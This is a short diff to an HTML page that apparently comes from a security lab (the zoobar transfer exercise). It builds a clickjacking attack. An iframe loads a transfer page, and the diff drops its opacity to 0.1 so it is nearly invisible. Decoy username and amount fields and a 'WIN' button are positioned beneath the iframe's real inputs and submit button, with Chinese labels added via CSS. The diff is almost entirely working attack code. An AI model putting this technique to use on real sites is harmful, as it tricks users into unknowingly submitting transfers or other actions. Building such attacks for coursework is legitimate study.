@@ -13,14 +13,38 @@
             /*top: -0px;*/
             /*left: -0px;*/
             z-index: 2;
-            opacity: 0.5;
+            opacity: 0.1;
             /*display: none;*/
         }
 
+        #username {
+            position: absolute;
+            top: 185px;
+            left: 605px;
+            /*在iframe提交按钮的之下*/
+            z-index: 1;
+        }
+
+        #username:before{
+            content: "向";
+            z-index: 1;
+        }
+        #zoobars {
+            position: absolute;
+            top: 225px;
+            left: 575px;
+            /*在iframe提交按钮的之下*/
+            z-index: 1;
+        }
+
+        #zoobars:before{
+            content: "索要";
+            z-index: 1;
+        }
         /*将按钮覆盖至提交按钮上*/
         #submit {
             position: absolute;
-            top: 255px;
+            top: 259px;
             left: 635px;
             /*在iframe提交按钮的之下*/
             z-index: 1;
@@ -31,7 +55,11 @@
 
 <iframe name="it" src="https://niss.com/transfer.php"></iframe>
 
+
+
 <form>
+    <input type="text" id="username">
+    <input type="text" id="zoobars">
     <input type="submit" id="submit" value="WIN">
 </form>
 
